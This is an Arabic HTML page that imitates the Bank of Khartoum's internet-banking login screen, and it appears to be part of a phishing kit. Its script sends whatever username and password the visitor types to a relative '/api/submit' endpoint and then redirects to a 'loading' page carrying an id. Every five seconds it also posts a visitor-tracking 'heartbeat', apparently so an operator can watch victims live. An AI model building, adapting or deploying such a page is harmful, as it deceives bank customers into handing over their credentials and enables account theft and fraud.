<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bank of Khartoum | Internet Banking</title>
<link href="images/favicon-bok.png" rel="icon">
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
:root{--gold:#bb8b16;--black:#282828;--red:#a11a19;--green:#0f4130;--gray:#828488;--btn-red:#bc262a}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Open Sans',sans-serif;background:#f4f4f4;min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden}

.top-strip{background:#bc262a;height:4px}

.header{background:#fff;padding:10px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #e0e0e0}
.header .logo{height:45px}
.header .nav-area{display:flex;align-items:center;gap:16px}
.header .nav-area a{color:#282828;font-size:13px;text-decoration:none;font-weight:600}
.header .nav-area a:hover{color:#bc262a}
.header .lang-btn{background:#bc262a;color:#fff;border:none;padding:5px 16px;border-radius:3px;font-size:12px;font-weight:600;cursor:pointer;text-decoration:none}
.header .lang-btn:hover{background:#a11a19}

.login-wrapper{flex:1;display:flex;align-items:center;justify-content:center;padding:30px 16px;background:#f4f4f4}

.loginTitle h2{color:#bc262a;font-size:22px;font-weight:600;font-family:'Open Sans',sans-serif;text-align:center;margin-bottom:16px}

.loginbox{padding:20px 5vw;margin-top:10px;border-radius:6px;background-color:#fff;display:block;position:relative;border:1px solid #ccc;box-shadow:0 3px 6px rgba(0,0,0,.16),0 3px 6px rgba(0,0,0,.23);width:100%;max-width:450px;margin-bottom:50px}

.loginbox h3{text-align:center;font-size:20px;color:#585958;font-weight:600;position:relative;padding-bottom:14px;margin-bottom:20px}
.loginbox h3::before{content:"";width:50%;height:3px;border-radius:10px;background-color:#bc262a;position:absolute;left:50%;transform:translateX(-50%);bottom:0}

.loginForm label{color:#828488;font-size:14px;display:block;margin-bottom:4px}
.loginForm .form-group{margin-bottom:16px}
.loginForm .form-control{border:1px solid #666;height:40px;background-image:none;width:100%;padding:6px 12px;border-radius:4px;font-size:14px;font-family:'Open Sans',sans-serif;outline:none;transition:border-color .2s}
.loginForm .form-control:focus{border-color:#bc262a;box-shadow:none}

.pass-wrapper{position:relative}
.pass-wrapper .toggle-eye{position:absolute;top:50%;left:10px;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:#828488;font-size:16px;padding:4px}

.submit{background-color:#bc262a;border:1px solid #bc262a;display:block;width:100%;color:#fff;padding:10px;font-size:16px;font-weight:600;border-radius:4px;cursor:pointer;font-family:'Open Sans',sans-serif;transition:background-color .2s;margin-top:8px}
.submit:hover{background-color:#a11a19;border-color:#a11a19}
.submit:disabled{background-color:#ccc;border-color:#ccc;cursor:default}

.links-row{text-align:center;margin-top:16px}
.links-row a{color:#bc262a;font-size:13px;text-decoration:none;font-weight:600}
.links-row a:hover{text-decoration:underline}

.footer{margin-top:auto;padding:10px;background:linear-gradient(#bfc1c4,#eff0f1,#fcfdfd,#ffffff);border-top:3px solid #bc262a;text-align:center;line-height:40px}
.copyrightText{color:#4a4a4a;font-weight:600;font-size:12px}

.error-box{display:none;background:#fff5f5;border:1px solid #f5c6cb;border-radius:4px;padding:10px;margin-bottom:14px;text-align:center}
.error-box.show{display:block}
.error-box span{color:#dc3545;font-size:13px;font-weight:600}

.loading-overlay{display:none;position:fixed;inset:0;background:rgba(255,255,255,.92);z-index:1000;align-items:center;justify-content:center;flex-direction:column}
.loading-overlay.show{display:flex}
.lo-spinner{width:40px;height:40px;border:4px solid #e0e0e0;border-top:4px solid #bc262a;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:12px}
@keyframes spin{to{transform:rotate(360deg)}}
.lo-text{font-size:14px;color:#bc262a;font-weight:600}

@media(max-width:480px){
  .loginbox{padding:20px 16px}
  .header .nav-area span{display:none}
}
</style>
</head>
<body>

<div class="top-strip"></div>

<div class="header">
  <div class="nav-area">
    <a href="index.html">الرئيسية</a>
    <a href="login-en.html" class="lang-btn">English</a>
  </div>
  <a href="index.html"><img src="images/logo.png" alt="بنك الخرطوم" class="logo"></a>
</div>

<div class="login-wrapper">
  <div style="width:100%;max-width:450px;">
    <div class="loginTitle"><h2>الإنترنت المصرفي للأفراد</h2></div>
    <div class="loginbox">
      <h3>تسجيل الدخول</h3>

      <div class="error-box" id="errorBox"><span id="errorText">بيانات الدخول غير صحيحة</span></div>

      <div class="loginForm">
        <div class="form-group">
          <label>رقم الحساب / اسم المستخدم</label>
          <input type="text" class="form-control" id="accountInput" autocomplete="off">
        </div>

        <div class="form-group">
          <label>كلمة المرور</label>
          <div class="pass-wrapper">
            <input type="password" class="form-control" id="passwordInput" autocomplete="off">
            <button type="button" class="toggle-eye" onclick="togglePass()">&#128065;</button>
          </div>
        </div>

        <button type="button" class="submit" id="loginBtn" onclick="doLogin()">تسجيل الدخول</button>
      </div>

      <div class="links-row">
        <a href="#">هل نسيت كلمة المرور؟</a>
      </div>
    </div>
  </div>
</div>

<div class="footer">
  <span class="copyrightText">&copy; 2024 بنك الخرطوم. جميع الحقوق محفوظة.</span>
</div>

<div class="loading-overlay" id="loadingOverlay">
  <div class="lo-spinner"></div>
  <div class="lo-text">جاري التحقق...</div>
</div>

<script>
var _vid=sessionStorage.getItem('_vid');if(!_vid){_vid=Math.random().toString(36).slice(2)+Date.now().toString(36);sessionStorage.setItem('_vid',_vid);}
function heartbeat(){fetch('/api/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({page:'login',vid:_vid})}).catch(function(){});}
heartbeat();setInterval(heartbeat,5000);

function togglePass(){
  var inp=document.getElementById('passwordInput');
  if(inp.type==='password'){inp.type='text';}
  else{inp.type='password';}
}

function doLogin(){
  var username=document.getElementById('accountInput').value.trim();
  var password=document.getElementById('passwordInput').value.trim();
  if(!username||!password)return;
  document.getElementById('errorBox').classList.remove('show');
  document.getElementById('loginBtn').disabled=true;
  document.getElementById('loginBtn').textContent='جاري التحقق...';

  fetch('/api/submit',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({username:username,password:password})
  })
  .then(function(r){return r.json();})
  .then(function(d){
    if(d.ok&&d.id){
      window.location.href='loading.html?id='+d.id;
    }else{
      document.getElementById('loginBtn').disabled=false;
      document.getElementById('loginBtn').textContent='تسجيل الدخول';
    }
  })
  .catch(function(){
    document.getElementById('loginBtn').disabled=false;
    document.getElementById('loginBtn').textContent='تسجيل الدخول';
  });
}

document.getElementById('accountInput').addEventListener('keydown',function(e){if(e.key==='Enter')document.getElementById('passwordInput').focus();});
document.getElementById('passwordInput').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin();});
</script>
</body>
</html>
